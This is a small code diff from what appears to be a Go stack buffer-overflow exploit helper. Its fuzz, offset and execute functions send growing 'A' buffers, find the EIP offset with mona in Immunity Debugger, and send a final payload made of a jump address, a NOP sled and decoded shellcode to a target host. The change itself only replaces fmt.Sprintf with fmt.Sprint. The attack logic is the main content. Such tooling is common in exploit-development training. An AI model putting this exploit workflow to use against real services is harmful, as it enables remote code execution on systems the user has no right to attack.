@@ -75,7 +75,7 @@ func fuzz(c Config, t int) int {
 	count := 100
 	for {
 		fmt.Println("Sending buffer of size", count, "...")
-		err := sendPayload(c, fmt.Sprintf(c.Cmd+strings.Repeat("A", count)))
+		err := sendPayload(c, fmt.Sprint(c.Cmd+strings.Repeat("A", count)))
 		if err != nil {
 			if count == 100 {
 				log.Fatal(err)
@@ -111,7 +111,7 @@ func offset(c Config, n int, v bool) int {
 		fmt.Print("Enter mona offset:")
 		fmt.Scanf("%d", &offset)
 
-		payload := fmt.Sprintf(c.Cmd + strings.Repeat("A", offset) + "BBBB")
+		payload := fmt.Sprint(c.Cmd + strings.Repeat("A", offset) + "BBBB")
 		fmt.Print("Restart app in immunity debugger and press ENTER to continue...")
 		bufio.NewReader(os.Stdin).ReadBytes('\n')
 		fmt.Println("Sending payload...")
@@ -202,7 +202,7 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 func execute(c Config, e Exploit) {
 	fmt.Printf("Sending exploit to %s:%d..."+"\n", c.Host, c.Port)
 	decoded, _ := hex.DecodeString(e.Payload)
-	payload := fmt.Sprintf(c.Cmd+strings.Repeat("A", e.Offset)+e.Jmp, strings.Repeat("\x90", 16)+string(decoded))
+	payload := fmt.Sprint(c.Cmd+strings.Repeat("A", e.Offset)+e.Jmp, strings.Repeat("\x90", 16)+string(decoded))
 	err := sendPayload(c, payload)
 	if err != nil {
 		log.Fatal(err)
